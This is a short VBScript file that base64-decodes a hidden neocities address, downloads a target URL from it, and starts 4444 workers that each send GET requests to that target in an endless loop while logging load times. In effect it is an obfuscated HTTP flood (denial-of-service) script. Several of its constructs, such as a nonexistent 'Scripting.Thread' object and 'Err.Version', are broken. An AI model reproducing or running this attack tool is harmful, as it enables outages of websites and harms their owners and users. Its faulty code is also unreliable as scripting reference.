Option Explicit

Dim a, j, link, f, clk, b5, z1, z2, url

a = "Lm5lb2NpdGllcy5vcmcvYmFzb2oudHh0"
j = DecodeBase64(a)

link = "https://femboiluver420" & j

Set f = CreateObject("MSXML2.XMLHTTP")

If Val(Left(Trim(CStr(Err.Version)), 1)) < 3 Then
    f.Open "GET", link, False
    f.Send
    clk = f.ResponseText
Else
    f.Open "GET", link, False
    f.Send
    clk = f.ResponseText
End If

Sub connect_to_website(url)
    Dim r0, r1, j34, r2, b6, e1, e2
    Do While True
        r0 = Timer
        Set r1 = CreateObject("MSXML2.XMLHTTP")
        r1.Open "GET", url, False
        r1.Send
        j34 = Timer
        Set r2 = CreateObject("MSXML2.XMLHTTP")
        r2.Open "GET", url, False
        r2.Send
        b6 = Timer
        e1 = j34 - r0
        e2 = b6 - j34
        With CreateObject("Scripting.FileSystemObject").OpenTextFile("res.txt", 8, True)
            .WriteLine "The website took " & FormatNumber(e1, 2) & " seconds to load."
            .WriteLine "Connected to " & url & " with status code: " & r1.status
            .WriteLine "The website took " & FormatNumber(e2, 2) & " seconds to load."
            .WriteLine "Connected to " & url & " with status code: " & r2.status
            .Close
        End With
    Loop
End Sub

Sub main(num_threads, url)
    Dim threads(), i, t
    ReDim threads(num_threads - 1)
    For i = 0 To num_threads - 1
        Set t = CreateObject("Scripting.Dictionary")
        t.Add "url", url
        Set threads(i) = CreateObject("Scripting.Dictionary")
        Set threads(i)("thread") = CreateObject("Scripting.Thread")
        threads(i)("thread").Init connect_to_website, t
        threads(i)("thread").Start
    Next
    For i = 0 To num_threads - 1
        threads(i)("thread").Wait
    Next
End Sub

Function DecodeBase64(ByVal s)
    Dim oXML, oNode
    Set oXML = CreateObject("MSXML2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.DataType = "bin.base64"
    oNode.Text = s
    DecodeBase64 = Stream_ReadBytes(oNode.NodeTypedValue)
End Function

Function Stream_ReadBytes(ByVal stream)
    Dim rs
    If Not stream Is Nothing Then
        rs = CreateObject("ADODB.Recordset")
        rs.Fields.Append "tmp", 1, 1
        rs.Open
        rs.AddNew
        rs("tmp").AppendChunk stream.Read
        rs.Update
        Stream_ReadBytes = rs("tmp").GetChunk(2^30 - 1)
        rs.Close
        Set rs = Nothing
    End If
End Function

Call main(4444, clk)
